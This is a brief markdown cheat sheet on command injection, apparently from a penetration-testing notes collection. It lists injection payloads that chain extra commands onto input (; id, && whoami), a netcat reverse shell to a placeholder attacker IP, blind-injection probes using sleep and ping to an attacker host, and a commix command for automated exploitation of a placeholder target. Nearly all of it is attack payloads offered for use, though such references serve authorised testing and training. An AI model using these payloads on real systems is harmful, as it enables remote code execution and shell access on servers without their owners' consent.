# Command Injection

## Manual Payloads


; id
&& whoami
| nc <ATTACKER_IP> 4444 -e /bin/bash


## Blind Injection

- Time delay: `; sleep 5`
- Out-of-band: `; ping -c 4 <ATTACKER_IP>`

## Automation

commix --url="http://<TARGET_IP>/ping.php?ip=127.0.0.1" --batch
